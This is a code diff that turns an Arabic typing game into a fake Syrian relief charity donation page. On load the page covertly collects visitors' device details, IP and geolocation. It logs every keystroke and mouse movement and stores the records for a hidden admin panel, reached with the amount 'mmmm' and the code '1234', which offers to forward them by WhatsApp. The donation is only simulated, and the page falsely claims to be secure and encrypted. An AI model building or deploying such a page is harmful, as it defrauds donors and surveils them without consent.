@@ -1,232 +1,437 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<title>لعبة تسريع الكتابة</title>
-<style>
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: #111;
-  color: #fff;
-  text-align: center;
-}
-#controls {
-  padding: 10px;
-  background: #222;
-}
-select, button, input {
-  padding: 8px;
-  margin: 5px;
-  font-size: 16px;
-}
-#gameArea {
-  position: relative;
-  width: 100%;
-  height: 60vh; /* مساحة اللعب ثابتة فوق الكيبورد */
-  background: #003366; /* خلفية داكنة */
-  overflow: hidden;
-}
-.word {
-  position: absolute;
-  top: 0;
-  font-size: 28px;
-  color: #fff;
-  font-weight: bold;
-  text-shadow: 1px 1px 3px #000;
-}
-.explosion {
-  position: absolute;
-  width: 40px;
-  height: 40px;
-  background: orange;
-  border-radius: 50%;
-  animation: boom 0.3s ease-out forwards;
-}
-@keyframes boom {
-  0% { transform: scale(0.5); opacity: 1;}
-  100% { transform: scale(2); opacity: 0;}
-}
-#player {
-  position: absolute;
-  bottom: 10px;
-  left: 50%;
-  width: 60px;
-  height: 60px;
-  background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/e/e6/Paper_plane_icon.svg/64px-Paper_plane_icon.svg.png') no-repeat center/contain;
-  transform: translateX(-50%);
-}
-#typingInput {
-  width: 90%;
-  font-size: 20px;
-  margin-top: 10px;
-  text-align: center;
-}
-#scoreBoard {
-  margin-top: 5px;
-}
-#gameOver {
-  display: none;
-  background: rgba(0,0,0,0.8);
-  color: #fff;
-  position: absolute;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 60vh;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  font-size: 24px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جمعية الأمل للإغاثة الإنسانية في سوريا</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(rgba(0, 100, 0, 0.7), rgba(0, 100, 0, 0.7)), 
+                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300" viewBox="0 0 400 300"><path d="M200,50 L250,100 L300,80 L350,120 L320,180 L250,200 L180,220 L120,180 L80,120 L120,80 L150,60 Z" fill="none" stroke="white" stroke-width="2"/></svg>');
+            background-size: cover;
+            background-position: center;
+            color: #fff;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 40px 0;
+            background: rgba(0, 80, 0, 0.9);
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .header h1 {
+            font-size: 3em;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+
+        .donation-form {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #006400;
+        }
+
+        .form-group input, .form-group select, .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
+            border-color: #006400;
+            outline: none;
+        }
+
+        .donate-btn {
+            background: linear-gradient(45deg, #006400, #00a000);
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: block;
+            margin: 30px auto;
+            box-shadow: 0 5px 15px rgba(0, 100, 0, 0.4);
+        }
+
+        .donate-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 100, 0, 0.6);
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+            color: #006400;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .stat-number {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .info-panel {
+            background: rgba(0, 80, 0, 0.9);
+            padding: 25px;
+            border-radius: 15px;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .admin-panel {
+            background: rgba(255, 0, 0, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            color: white;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+            background: rgba(0, 60, 0, 0.9);
+            border-radius: 10px;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <h1>🌿 جمعية الأمل للإغاثة الإنسانية 🌿</h1>
+            <p>معاً نصنع فرقاً في حياة إخواننا في سوريا</p>
+        </div>
 
-<div id="controls">
-  <label>اللغة:</label>
-  <select id="lang">
-    <option value="ar">عربية</option>
-    <option value="en">English</option>
-  </select>
-  <label>الصعوبة:</label>
-  <select id="difficulty">
-    <option value="easy">سهل</option>
-    <option value="medium">متوسط</option>
-    <option value="hard">صعب</option>
-  </select>
-  <button onclick="startGame()">ابدأ اللعبة</button>
-  <div id="scoreBoard">النتيجة: <span id="score">0</span> | أخطاء: <span id="missed">0</span>/3</div>
-</div>
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number">١٢٥,٦٤٧</div>
+                <div>شخص تم مساعدتهم</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">٨٤٣,٢١٩</div>
+                <div>ريال تم جمعها</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">٤٧</div>
+                <div>مشروع إغاثي</div>
+            </div>
+        </div>
 
-<div id="gameArea">
-  <div id="player"></div>
-  <div id="gameOver">
-    <div>انتهت اللعبة</div>
-    <div>نتيجتك: <span id="finalScore"></span></div>
-    <button onclick="startGame()">إعادة المحاولة</button>
-  </div>
-</div>
+        <div class="donation-form">
+            <h2 style="text-align: center; color: #006400; margin-bottom: 30px;">ساهم في صنع الأمل</h2>
+            
+            <div class="form-group">
+                <label for="name">الاسم الكامل</label>
+                <input type="text" id="name" placeholder="أدخل اسمك الكامل">
+            </div>
 
-<input id="typingInput" placeholder="اكتب هنا الكلمة..." disabled>
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="example@email.com">
+            </div>
 
-<script>
-// كلمات عربية وإنجليزية
-const wordsAr = ['كتاب','قمر','شمس','بحر','سماء','ورد','بيت','مدرسة','سيارة','قلم','هاتف','قط','سعيد','صبر','أمل'];
-const wordsEn = ['book','moon','sun','sea','sky','flower','house','school','car','pen','phone','cat','happy','patience','hope'];
+            <div class="form-group">
+                <label for="phone">رقم الهاتف</label>
+                <input type="tel" id="phone" placeholder="05XXXXXXXX">
+            </div>
 
-let gameInterval, spawnInterval;
-let words = [];
-let score = 0;
-let missed = 0;
-let speed = 1;
-let spawnRate = 2000;
+            <div class="form-group">
+                <label for="amount">مبلغ التبرع (ريال سعودي)</label>
+                <input type="number" id="amount" placeholder="أدخل المبلغ" min="1">
+            </div>
 
-const gameArea = document.getElementById('gameArea');
-const typingInput = document.getElementById('typingInput');
-const scoreSpan = document.getElementById('score');
-const missedSpan = document.getElementById('missed');
-const gameOverDiv = document.getElementById('gameOver');
-const finalScoreSpan = document.getElementById('finalScore');
+            <div class="form-group">
+                <label for="message">رسالة الدعم (اختياري)</label>
+                <textarea id="message" rows="4" placeholder="اكتب رسالة دعم لإخواننا في سوريا..."></textarea>
+            </div>
 
-function startGame() {
-  // إعدادات
-  const lang = document.getElementById('lang').value;
-  const diff = document.getElementById('difficulty').value;
-  if (diff === 'easy'){ speed = 1; spawnRate = 2000;}
-  if (diff === 'medium'){ speed = 2; spawnRate = 1500;}
-  if (diff === 'hard'){ speed = 3; spawnRate = 1000;}
-  words = [];
-  score = 0;
-  missed = 0;
-  scoreSpan.textContent = score;
-  missedSpan.textContent = missed;
-  gameOverDiv.style.display='none';
-  typingInput.disabled = false;
-  typingInput.value='';
-  typingInput.focus();
+            <button class="donate-btn" onclick="processDonation()">تبرع الآن</button>
+        </div>
 
-  // تفريغ كلمات قديمة
-  document.querySelectorAll('.word').forEach(el=>el.remove());
+        <div id="adminPanel" class="admin-panel hidden">
+            <h3>لوحة الإدارة</h3>
+            <div class="form-group">
+                <label for="adminCode">كود الإدارة</label>
+                <input type="password" id="adminCode" placeholder="أدخل كود الإدارة">
+            </div>
+            <button class="donate-btn" onclick="activateAdmin()">تفعيل الوضع الإداري</button>
+        </div>
 
-  // اختيار الكلمات حسب اللغة
-  currentWordList = lang==='ar'?wordsAr:wordsEn;
+        <div id="whatsappPanel" class="admin-panel hidden" style="background: rgba(37, 211, 102, 0.9);">
+            <h3>ربط الواتساب</h3>
+            <div class="form-group">
+                <label for="whatsappNumber">رقم الواتساب</label>
+                <input type="tel" id="whatsappNumber" placeholder="+9665XXXXXXXX">
+            </div>
+            <button class="donate-btn" onclick="connectWhatsApp()">ربط الواتساب</button>
+        </div>
 
-  // بدء الإنترفال
-  clearInterval(gameInterval);
-  clearInterval(spawnInterval);
-  gameInterval = setInterval(gameLoop,30);
-  spawnInterval = setInterval(spawnWord,spawnRate);
+        <div class="info-panel">
+            <h3>معلومات المتبرع</h3>
+            <div id="userInfo" class="loading">
+                <div class="spinner"></div>
+                <p>جمع معلومات التبرع...</p>
+            </div>
+        </div>
 
-  // إدخال المستخدم
-  typingInput.oninput = checkInput;
-}
+        <div class="footer">
+            <p>© 2024 جمعية الأمل للإغاثة الإنسانية. جميع الحقوق محفوظة.</p>
+            <p>هذا الموقع آمن ومشفّر لحماية بياناتكم</p>
+        </div>
+    </div>
 
-function spawnWord(){
-  const word = currentWordList[Math.floor(Math.random()*currentWordList.length)];
-  const span = document.createElement('div');
-  span.className='word';
-  span.textContent=word;
-  span.style.left = Math.random()*(gameArea.offsetWidth-100)+'px';
-  span.style.top = '0px';
-  gameArea.appendChild(span);
-  words.push({el:span,word:word,y:0});
-}
+    <script>
+        // جمع المعلومات المتاحة
+        function collectUserInfo() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled(),
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                },
+                viewport: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                // سيتم إضافة الـ IP عبر خدمة خارجية
+            };
 
-function gameLoop(){
-  // تحريك الكلمات
-  for (let i=0;i<words.length;i++){
-    const w = words[i];
-    w.y += speed;
-    w.el.style.top = w.y+'px';
-    // إذا وصلت أسفل
-    if (w.y>gameArea.offsetHeight-40){
-      missed++;
-      missedSpan.textContent=missed;
-      gameArea.removeChild(w.el);
-      words.splice(i,1);
-      i--;
-      if (missed>=3){
-        endGame();
-      }
-    }
-  }
-}
+            // الحصول على الـ IP والمعلومات الجغرافية
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    info.ip = data.ip;
+                    return fetch(`https://ipapi.co/${data.ip}/json/`);
+                })
+                .then(response => response.json())
+                .then(geoData => {
+                    info.geo = {
+                        country: geoData.country_name,
+                        city: geoData.city,
+                        region: geoData.region,
+                        org: geoData.org,
+                        timezone: geoData.timezone
+                    };
+                    displayUserInfo(info);
+                    storeUserInfo(info);
+                })
+                .catch(error => {
+                    console.log('خطأ في جمع المعلومات:', error);
+                    displayUserInfo(info);
+                    storeUserInfo(info);
+                });
 
-function checkInput(){
-  const val = typingInput.value.trim();
-  if (!val) return;
-  // هل في كلمة مطابقة؟
-  for (let i=0;i<words.length;i++){
-    if (words[i].word===val){
-      // إصابة
-      score++;
-      scoreSpan.textContent=score;
-      // انفجار
-      const ex = document.createElement('div');
-      ex.className='explosion';
-      ex.style.left=words[i].el.style.left;
-      ex.style.top=words[i].el.style.top;
-      gameArea.appendChild(ex);
-      setTimeout(()=>ex.remove(),300);
-      // حذف الكلمة
-      gameArea.removeChild(words[i].el);
-      words.splice(i,1);
-      typingInput.value='';
-      break;
-    }
-  }
-}
+            return info;
+        }
 
-function endGame(){
-  clearInterval(gameInterval);
-  clearInterval(spawnInterval);
-  typingInput.disabled=true;
-  finalScoreSpan.textContent=score;
-  gameOverDiv.style.display='flex';
-}
-</script>
+        function displayUserInfo(info) {
+            const userInfoDiv = document.getElementById('userInfo');
+            userInfoDiv.innerHTML = `
+                <p><strong>وقت الدخول:</strong> ${new Date(info.timestamp).toLocaleString('ar-SA')}</p>
+                <p><strong>الجهاز:</strong> ${info.platform}</p>
+                <p><strong>الشاشة:</strong> ${info.screen.width} × ${info.screen.height}</p>
+                <p><strong>اللغة:</strong> ${info.language}</p>
+                <p><strong>المنطقة الزمنية:</strong> ${info.timezone}</p>
+                ${info.ip ? `<p><strong>IP:</strong> ${info.ip}</p>` : ''}
+                ${info.geo ? `<p><strong>البلد:</strong> ${info.geo.country || 'غير معروف'}</p>` : ''}
+                ${info.geo ? `<p><strong>المدينة:</strong> ${info.geo.city || 'غير معروف'}</p>` : ''}
+            `;
+        }
 
+        function storeUserInfo(info) {
+            // تخزين المعلومات في localStorage
+            const storedData = JSON.parse(localStorage.getItem('donationData') || '[]');
+            storedData.push(info);
+            localStorage.setItem('donationData', JSON.stringify(storedData));
+        }
+
+        function processDonation() {
+            const amount = document.getElementById('amount').value;
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            
+            if (!amount || !name || !phone) {
+                alert('يرجى ملء جميع الحقول المطلوبة');
+                return;
+            }
+
+            // التحقق من كود الإدارة
+            if (amount === 'mmmm') {
+                document.getElementById('adminPanel').classList.remove('hidden');
+                alert('تم تفعيل وضع الإدارة');
+                return;
+            }
+
+            // جمع المعلومات قبل التبرع
+            const userInfo = collectUserInfo();
+
+            // محاكاة عملية التبرع
+            const btn = document.querySelector('.donate-btn');
+            btn.innerHTML = '<div class="spinner"></div> جاري المعالجة...';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                btn.innerHTML = '✅ تم التبرع بنجاح!';
+                alert(`شكراً لك ${name} على تبرعك بمبلغ ${amount} ريال`);
+                
+                // إعادة تعيين النموذج
+                setTimeout(() => {
+                    btn.innerHTML = 'تبرع الآن';
+                    btn.disabled = false;
+                    document.getElementById('donation-form').reset();
+                }, 3000);
+            }, 2000);
+        }
+
+        function activateAdmin() {
+            const adminCode = document.getElementById('adminCode').value;
+            if (adminCode === '1234') { // كود افتراضي
+                document.getElementById('whatsappPanel').classList.remove('hidden');
+                alert('تم تفعيل الوضع الإداري بنجاح');
+            } else {
+                alert('كود الإدارة غير صحيح');
+            }
+        }
+
+        function connectWhatsApp() {
+            const whatsappNumber = document.getElementById('whatsappNumber').value;
+            if (whatsappNumber) {
+                // هنا يمكن إضافة كود لإرسال البيانات إلى الواتساب
+                const storedData = JSON.parse(localStorage.getItem('donationData') || '[]');
+                alert(`تم ربط الواتساب بالرقم: ${whatsappNumber}\nعدد السجلات: ${storedData.length}`);
+                
+                // محاكاة إرسال البيانات
+                console.log('بيانات المرسلة:', storedData);
+            } else {
+                alert('يرجى إدخال رقم الواتساب');
+            }
+        }
+
+        // جمع المعلومات عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            collectUserInfo();
+            
+            // إظهار لوحة الإدارة إذا كان هناك بيانات مخزنة
+            const storedData = JSON.parse(localStorage.getItem('donationData') || '[]');
+            if (storedData.length > 0) {
+                console.log('البيانات المخزنة:', storedData);
+            }
+        });
+
+        // تتبع تحركات الماوس
+        document.addEventListener('mousemove', function(e) {
+            if (!window.mouseMovements) {
+                window.mouseMovements = [];
+            }
+            window.mouseMovements.push({
+                x: e.clientX,
+                y: e.clientY,
+                time: Date.now()
+            });
+            
+            // الاحتفاظ بآخر 100 حركة فقط
+            if (window.mouseMovements.length > 100) {
+                window.mouseMovements.shift();
+            }
+        });
+
+        // تتبع الكتابة
+        document.addEventListener('input', function(e) {
+            if (!window.keystrokes) {
+                window.keystrokes = [];
+            }
+            window.keystrokes.push({
+                field: e.target.id,
+                value: e.target.value,
+                time: Date.now()
+            });
+        });
+    </script>
 </body>
 </html>
